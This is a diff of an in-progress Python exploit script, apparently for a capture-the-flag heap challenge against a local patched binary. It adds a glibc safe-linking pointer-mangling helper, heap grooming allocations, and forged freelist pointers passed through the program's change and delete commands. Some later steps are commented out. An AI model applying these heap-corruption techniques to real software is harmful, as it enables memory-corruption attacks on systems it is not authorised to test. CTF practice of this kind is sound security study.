@@ -1,10 +1,12 @@
 #!/usr/bin/env python
 import ptrlib as ptr
 import sys
+import os
 
 exe = ptr.ELF("./run_patched")
 libc = ptr.ELF("./libc.so.6")
 ld = ptr.ELF("./ld-linux-x86-64.so.2")
+os.system(f"killall {exe.filepath}")
 
 
 def connect():
@@ -24,6 +26,10 @@ def unwrap(x):
         exit(1)
     else:
         return x
+
+
+def safe_link(heap_base: int, current_offset: int, dest_offset: int):
+    return (heap_base + current_offset) >> 12 ^ (heap_base + dest_offset)
 
 
 def main():
@@ -78,8 +84,25 @@ def main():
     heap_base = heap_base >> 12 << 12
     ptr.logger.info(f"heap_base = {hex(heap_base)}")
 
-    input(">>")
     new("B", "A" * 8)
+    new("C", "A" * 8)
+
+    for _ in range(22):
+        new("extend", "extend")
+
+    # delete("A")
+    delete("B")
+    delete("C")
+    restart()
+    change("root", "new_root")
+    delete("root")
+    change(ptr.p64(safe_link(heap_base, 0x5a0, 0x570)), "fake_key")
+    delete(ptr.p64(safe_link(heap_base, 0x5a0, 0x570)))
+    # new(ptr.p64(safe_link(heap_base, 0x5a0, 0x5c0)), ptr.p64(0))
+    # new("dummy", "A" * 8) 
+    # new("fakesize", ptr.p64(0x421))
+    # input(">>")
+    # delete("A" * 8)
     input(">>")
     return
 
